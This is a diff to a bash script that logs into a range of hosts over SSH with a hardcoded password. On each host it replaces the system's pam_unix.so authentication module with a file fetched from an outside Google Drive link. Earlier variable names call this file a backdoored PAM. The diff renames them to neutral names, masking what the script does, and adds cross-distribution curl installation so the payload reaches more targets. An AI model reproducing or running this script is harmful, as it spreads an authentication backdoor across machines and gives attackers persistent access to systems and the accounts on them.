@@ -6,8 +6,8 @@ password="Password1!"
 timeout=5
 max_jobs=10
 path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
-path_to_backdoored_pam="/tmp/pam_unix.so"
-link_to_backdoored_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
+path_to_tmp_pam="/tmp/pam_unix.so"
+link_to_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
 
 IPs=()
 network_id="1.1"
@@ -23,18 +23,29 @@ create_IPs() {
 }
 
 main() {
+    curl -o "$path_to_tmp_pam" "$link_to_pam" && \
+    echo "Downloaded pam file successfully" || \
+    { echo "Failed to download pam file"; exit 1; }
+
+    sleep 5
+
     create_IPs
 
     job_count=0
     for IP in "${IPs[@]}"; do
         {
-            sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_backdoored_pam" "$username@$IP:$path_to_pam" && \
+            sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_tmp_pam" "$username@$IP:$path_to_pam" && \
             echo "SUCCESS  (SCP): $IP" || \
             {
                 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
-                    echo \"$password\" | sudo -S curl -o \"$path_to_backdoored_pam\" \"$link_to_backdoored_pam\" && \
+                    echo \"$password\" | sudo -S apt install -y curl || \
+                    echo \"$password\" | sudo -S yum install -y curl || \
+                    echo \"$password\" | sudo -S zypper install -y curl || \
+                    echo \"$password\" | sudo -S pacman -Syu curl --noconfirm && \
                     sleep 10 && \
-                    echo \"$password\" | sudo -S mv \"$path_to_backdoored_pam\" \"$path_to_pam\"
+                    echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\" && \
+                    sleep 10 && \
+                    echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
                 " && \
                 echo "SUCCESS (CURL): $IP" || \
                 echo "FAIL    (CURL): $IP"
@@ -48,7 +59,7 @@ main() {
             ((job_count--))
         fi
     done
-
+    
     wait
 }
 
